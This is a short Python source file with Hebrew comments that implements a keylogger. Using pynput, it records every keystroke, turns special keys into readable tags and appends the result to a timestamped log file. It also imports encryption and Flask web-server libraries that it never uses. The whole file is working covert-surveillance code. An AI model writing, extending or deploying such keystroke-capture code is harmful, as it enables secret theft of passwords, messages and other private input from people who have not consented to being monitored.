from pynput.keyboard import Listener, Key
from datetime import datetime
from cryptography.fernet import Fernet
from flask import Flask, render_template_string, request, jsonify
import os
import threading

# יצירת שם קובץ חדש עם תאריך ושעה
filename = datetime.now().strftime("keylogger_%Y-%m-%d_%H-%M-%S.txt")

def keylogger(key):
    try:
        # אם זה אות או מספר רגיל
        k = key.char
    except AttributeError:
        # מקש מיוחד
        special_keys = {
            Key.enter: "[ENTER]",
            Key.space: " ",
            Key.backspace: "[BACKSPACE]",
            Key.tab: "[TAB]",
            Key.shift: "[SHIFT]",
            Key.ctrl_l: "[CTRL]",
            Key.alt_l: "[ALT]"
        }
        # אם המקש לא במילון → שמו הכללי
        k = special_keys.get(key, f"[{key}]")

    # לוודא תמיד שמחרוזת תיכתב
    if k is not None:
        k = str(k)
        with open(filename, "a", encoding="utf-8") as file:
            file.write(k)

with Listener(on_press=keylogger) as listener:
    listener.join()